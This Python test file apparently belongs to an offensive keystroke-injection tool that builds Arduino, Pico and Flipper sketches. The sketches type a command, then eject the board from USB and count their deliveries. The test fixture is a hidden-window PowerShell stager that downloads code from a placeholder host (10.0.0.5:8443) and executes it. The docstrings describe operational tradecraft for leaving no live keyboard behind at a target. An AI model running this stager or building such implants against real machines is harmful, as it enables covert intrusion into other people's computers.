"""HID: the board ejects itself instead of staying a live keyboard.

The countdown used to be the only answer to "do not type on the machine that
wrote you": fifteen seconds of blinking LED to unplug it. A window is not a
guarantee, and a board left plugged in afterwards stayed an armed keyboard in
the room.

The eject is the guarantee. After typing, the sketch clears the USB D+ pull-up
(``UDCON``'s ``DETACH`` bit), so the host sees an unplug while the board keeps
running on VBUS; on the first boot after a flash it ejects INSTEAD of typing,
which means the machine that wrote it does not merely get ignored — the
keyboard disappears from it.

Nothing here flashes a board: every assertion is on the generated text, which
is the only thing this module produces.
"""

import unittest

from phantom.utils.hid_builder import build_hid_payload

# Long enough to be typed in bursts (> CADENCE_MIN_CHARS), like the real stager.
COMMAND = (
    'powershell -w h -c "$i=0;while($i -lt 20){try{iex(iwr '
    "'https://10.0.0.5:8443/s/windows' -UseB).Content;break}catch{$i++}}\""
)


def _content(board, **kwargs):
    return build_hid_payload(board, COMMAND, **kwargs).content


def _notes(board, **kwargs):
    return " ".join(build_hid_payload(board, COMMAND, **kwargs).notes)


class TestTheDefaultLeavesNoEjectInTheArtefact(unittest.TestCase):
    """Ejection is opt-in: an artefact built without it must not change."""

    def test_an_arduino_sketch_does_not_eject_by_default(self):
        body = _content("arduino")
        self.assertNotIn("usbEject", body)
        self.assertNotIn("UDCON", body)

    def test_a_pico_does_not_hide_its_keyboard_by_default(self):
        self.assertNotIn("usb_hid.disable", _content("pico"))


class TestTheBoardEjectsAfterTyping(unittest.TestCase):
    """The ORDER is the property: eject last, once nothing else is typed."""

    def test_the_sketch_clears_the_usb_pull_up(self):
        body = _content("arduino", eject=True)
        self.assertIn("UDCON |= (1 << DETACH);", body)
        # the register lives in the AVR headers, included only with the feature
        self.assertIn("#include <avr/io.h>", body)

    def test_ejecting_happens_after_the_enter_key(self):
        body = _content("arduino", eject=True)
        # rindex: the FIRST call is the silent boot gate, before any typing
        self.assertLess(body.index("Keyboard.press(KEY_RETURN)"),
                        body.rindex("usbEject();"))

    def test_the_eject_helper_is_defined_before_setup_uses_it(self):
        body = _content("arduino", eject=True)
        self.assertLess(body.index("static void usbEject()"),
                        body.index("void setup()"))

    def test_the_countdown_still_comes_before_the_typing(self):
        # eject must not disturb the ordering the countdown relies on
        body = _content("arduino", eject=True, countdown_s=15)
        self.assertLess(body.index("countdown(15);"),
                        body.index("Keyboard.print"))

    def test_a_pico_hides_its_keyboard_last(self):
        body = _content("pico", eject=True)
        self.assertIn("usb_hid.disable()", body)
        # rindex: the definition and the silent-boot call both come earlier
        self.assertLess(body.index("kbd.press(Keycode.ENTER)"),
                        body.rindex("_usb_eject()"))


class TestTheFirstBootAfterAFlashEjectsInsteadOfTyping(unittest.TestCase):
    """The operator's own machine: silence is not enough, it has to go away."""

    def test_the_silent_branch_ejects_when_the_serial_rescue_is_off(self):
        body = _content("arduino", eject=True, first_boot_safe=True,
                        rescue_serial=False)
        start = body.index("if (justFlashed())")
        gate = body[start:body.index("return;", start)]
        self.assertIn("usbEject();", gate)

    def test_the_silent_branch_stays_attached_for_the_serial_rescue(self):
        """The contract changed on 2026-11-01, and this pins why.

        Ejecting on the silent branches left the board with no COM port, no
        1200-baud touch and no upload target: the only way back in was a wire
        across the reset pin. The silent branches are mute anyway, so keeping
        the port costs nothing operational and buys a reflash that needs no
        hardware.
        """
        body = _content("arduino", eject=True, first_boot_safe=True)
        start = body.index("if (justFlashed())")
        gate = body[start:body.index("return;", start)]
        self.assertNotIn("usbEject();", gate)
        self.assertIn("Serial.begin", body)

    def test_the_spent_branch_also_stays_attached(self):
        body = _content("arduino", eject=True, first_boot_safe=True)
        start = body.index("if (outOfShots())")
        gate = body[start:body.index("return;", start)]
        self.assertNotIn("usbEject();", gate)

    def test_the_delivery_itself_still_ejects(self):
        # ejecting after the payload ran is the operational property: no live
        # keyboard is left in the room
        body = _content("arduino", eject=True)
        self.assertIn("usbEject();  // done", body)

    def test_a_pico_ejects_before_it_parks(self):
        body = _content("pico", eject=True, first_boot_safe=True)
        start = body.index("if _just_written():")
        gate = body[start:body.index("while True:", start)]
        self.assertIn("_usb_eject()", gate)

    def test_without_the_guard_there_is_no_silent_branch_to_eject_from(self):
        body = _content("arduino", eject=True, first_boot_safe=False)
        self.assertNotIn("justFlashed", body)


class TestADuckyScriptDeviceCannotEject(unittest.TestCase):
    """It cannot, and the artefact says so instead of pretending."""

    def test_no_usb_control_is_emitted(self):
        body = _content("flipper", eject=True)
        self.assertNotIn("UDCON", body)
        self.assertNotIn("usb_hid", body)

    def test_the_note_says_it_keeps_typing_where_it_was_written(self):
        note = _notes("flipper", eject=True)
        self.assertIn("eject NOT available", note)
        self.assertIn("machine that writes it", note)


class TestTheNoteExplainsTheCost(unittest.TestCase):
    """A guard the operator does not know about is a surprise, not a guard."""

    def test_the_arduino_note_describes_the_eject(self):
        self.assertIn("EJECTS itself", _notes("arduino", eject=True))

    def test_the_pico_note_names_the_power_cycle(self):
        self.assertIn("power cycle", _notes("pico", eject=True))

    def test_there_is_no_eject_note_when_it_was_not_asked_for(self):
        self.assertNotIn("EJECTS itself", _notes("arduino"))


class TestTheEnterSurvivesTheEject(unittest.TestCase):
    """A detach in the same millisecond as the last report loses the Enter.

    Measured on hardware 2026-11-01: the board typed the command, then the
    Run dialog stayed open with the text in it. ``UDCON |= DETACH`` clears the
    D+ pull-up immediately, so the release report (and sometimes the press)
    never gets polled. The eject has to wait for the host, not race it.
    """

    def test_the_sketch_waits_before_it_drops_the_pull_up(self):
        body = _content("arduino", eject=True)
        enter = body.index("Keyboard.press(KEY_RETURN)")
        self.assertIn("delay(400);", body[enter:body.rindex("usbEject();")])

    def test_the_enter_key_is_held_across_a_frame(self):
        body = _content("arduino")
        enter = body.index("Keyboard.press(KEY_RETURN)")
        release = body.index("Keyboard.releaseAll();", enter)
        self.assertIn("delay(60);", body[enter:release])


class TestTheBoardFiresOncePerFlash(unittest.TestCase):
    """Carrying the board home must not re-inject on the machine that wrote it.

    The first-boot tag answers "has this sketch ever booted". After a delivery
    on the target that is not the same question as "has it ever typed": the
    board came back with a MATCHING tag and typed the whole payload again on
    the operator's machine.
    """

    def test_the_marker_is_written_before_the_first_keystroke(self):
        body = _content("arduino")
        self.assertIn("markTyped();", body)
        self.assertLess(body.index("markTyped();"), body.index("Keyboard.print"))

    def test_a_spent_board_returns_before_it_types(self):
        body = _content("arduino")
        start = body.index("if (outOfShots())")
        self.assertIn("return;", body[start:body.index("return;", start) + 8])
        self.assertLess(start, body.index("Keyboard.print"))

    def test_a_reflash_with_a_new_nonce_changes_the_build_tag(self):
        """Without this the spent byte survived the flash, for ever.

        Measured 2026-11-01: the tag is content-derived, so flashing the SAME
        artefact again produced the SAME tag — ``justFlashed()`` answered
        false, the one-shot byte set by the previous delivery was never
        cleared, and a board that had just been reflashed typed nothing on the
        target. The flasher now stamps a per-flash nonce.
        """
        def tag(body):
            line = [ln for ln in body.splitlines() if "BUILD_TAG = 0x" in ln][0]
            return line.split("0x", 1)[1].split("UL", 1)[0]

        first = _content("arduino", build_nonce="aaaa1111")
        second = _content("arduino", build_nonce="bbbb2222")
        assert tag(first) != tag(second)

    def test_no_nonce_keeps_generation_deterministic(self):
        # two artefacts built from the same inputs must stay byte-identical, or
        # "is this the artefact I tested" stops being answerable
        assert _content("arduino") == _content("arduino")

    def test_the_nonce_does_not_change_what_is_typed(self):
        plain = _content("arduino")
        nonced = _content("arduino", build_nonce="deadbeef")
        typed = [ln for ln in plain.splitlines() if "Keyboard.print" in ln]
        same = [ln for ln in nonced.splitlines() if "Keyboard.print" in ln]
        assert typed == same

    def test_reflashing_resets_the_counter(self):
        # otherwise the SECOND flash would be silent for ever, and the board
        # would be dead with no way to tell why
        body = _content("arduino", first_boot_safe=True)
        start = body.index("static bool justFlashed()")
        func = body[start:body.index("static bool outOfShots()")]
        self.assertIn("EEPROM.write(SHOT_ADDR, SHOTS);", func)

    def test_the_counter_needs_the_eeprom_tag(self):
        # no EEPROM include means nowhere to keep the counter: the feature is
        # dropped instead of emitting a sketch that cannot compile
        body = _content("arduino", first_boot_safe=False)
        self.assertNotIn("markTyped", body)
        self.assertNotIn("outOfShots", body)

    def test_repeat_turns_it_off(self):
        body = _content("arduino", shots=0)
        self.assertNotIn("markTyped", body)
        self.assertNotIn("outOfShots", body)

    def test_the_default_is_more_than_one_delivery(self):
        """A board that types exactly once is a board you re-flash on the bench.

        Measured 2026-11-01: with a one-shot marker the board was spent after
        the first shell, and the operator could not re-flash from inside the
        target's room.
        """
        body = _content("arduino")
        self.assertIn("static const uint8_t SHOTS = 3;", body)

    def test_the_counter_is_decremented_before_each_delivery(self):
        body = _content("arduino")
        self.assertIn("EEPROM.write(SHOT_ADDR, (uint8_t)(left - 1));", body)
        self.assertLess(body.index("markTyped();"),
                        body.index("Keyboard.print"))

    def test_a_custom_count_reaches_the_sketch(self):
        body = _content("arduino", shots=7)
        self.assertIn("static const uint8_t SHOTS = 7;", body)

    def test_the_note_says_how_many_deliveries(self):
        self.assertIn("DELIVERIES per flash", _notes("arduino"))

    def test_a_duckyscript_device_is_told_it_cannot(self):
        self.assertIn("delivery counter NOT available", _notes("flipper"))


if __name__ == "__main__":
    unittest.main()
